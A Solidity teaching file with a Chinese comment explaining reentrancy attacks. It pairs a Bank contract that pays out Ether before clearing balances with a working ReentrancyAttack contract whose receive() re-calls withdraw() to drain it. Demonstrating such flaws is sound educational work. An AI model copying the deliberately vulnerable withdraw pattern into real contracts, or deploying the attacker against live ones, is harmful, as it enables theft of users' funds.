// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/**
    合约重入攻击，是指在同一交易中对业务合约进行多次调用，从而实现对合约的攻击。
    合约重入
    如果业务合约的公开方法中，有提现 Ether 或者调用第三方合约的操作，那么就可以对合约方法的进行二次以及多次调用，从而实现合约重入。
    重入攻击
    大多数情况下，重入攻击利用了业务合约先提现 Ether 或者调用第三方合约，然后修改合约状态的漏洞，从而实现重入攻击。
 */

interface IBank {

    function deposit() external payable;

    function withdraw() external;

}

contract Bank {

    mapping(address => uint256) public balance;
    uint256 public totalDeposit;

    function ethBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
        totalDeposit += msg.value;
    }

    function withdraw() external {
        require(balance[msg.sender] > 0, "Bank: no balance");
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        totalDeposit -= balance[msg.sender];
        balance[msg.sender] = 0;
    }

}

contract ReentrancyAttack {

    IBank bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function doDeposit() external payable {
        bank.deposit{value: msg.value}();
    }

    function doWithdraw() external {
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        bank.withdraw();
    }
}